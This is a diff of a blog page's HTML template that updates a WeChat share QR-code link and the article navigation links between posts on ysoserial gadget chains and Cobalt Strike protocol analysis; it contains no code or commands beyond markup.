@@ -305,7 +359,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -319,18 +373,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ysoserial学习之Jdk7u21
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/05/01/cobaltStrike%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">cobaltStrike通信协议分析</div>
+    <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ysoserial学习之CommonsBeanutils1</div>
       <i class="icon-circle-right"></i>
     </a>
   
